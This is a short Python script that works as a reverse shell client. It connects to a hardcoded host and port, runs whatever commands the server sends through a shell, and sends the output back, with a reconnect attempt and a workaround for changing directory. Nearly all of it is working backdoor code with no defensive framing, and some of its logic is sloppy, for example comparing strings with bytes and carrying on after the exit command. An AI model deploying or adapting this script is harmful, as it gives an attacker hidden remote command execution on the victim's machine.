#!/usr/bin/env python3

import socket
import subprocess, os


HOST = '192.168.1.17'
PORT = 64442

# take current dir path and remove the last directory name
# this is a workaround for cd not working via subprocess
def strSplit(string):
    splitStr = string.split('\\')
    strArrLen = len(splitStr) - 1
    splitStr.pop(strArrLen)
    return '\\'.join(splitStr)

# return the current directory path & remove the final directory folder
# e.g path = C:\Users\Admin => backDir => C:\Users
# text=True returns strings instead of bytes - we dont have to decode stdout
def backDir():
    getEncPath = subprocess.run(['cd'], stdout=subprocess.PIPE, text=True, shell=True)
    currentPath = getEncPath.stdout
    desiredPath = strSplit(currentPath)
    os.chdir(os.path.abspath(desiredPath))    # change dir to desiredPath

# extract subprocess.stdout output from cmd and encode it for sending to server
def encodeStdout(data):
    stdout = data.stdout
    return stdout.encode()

# connection created with server
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((HOST, PORT))
    while True:
        # the commands being sent by the server shouldn't ever exceed 128 bytes
        try:
            rawData = sock.recv(128)
            data = rawData.decode('utf-8')

            if ('exit' in data):
                sock.sendall(b'Exit command confirmed by client! Exiting...')
                sock.close()

            # if server user submits blank command, restart loop
            if (data == b'' or data == b'nodata'):
                sock.sendall(b'No data submitted!')
                continue
                
            # if the user wants to change directory, we can't run it via subprocess
            # compared to subprocess.run
            if ( 'cd ..' in data ):
                print('CMD: cd .. ')
                backDir()
                sock.sendall(b'Command succesful')
                continue
                
            else:
                print('Didnt find cd in your command')
                cmd = subprocess.check_output(data, shell=True)
                print(cmd) 
                sock.sendall(cmd)

        except Exception as ConnectionResetError:
            print('Disconnected from host.Attempting reconnect')
            sock.connect((HOST, PORT))
# close the socket
sock.close()
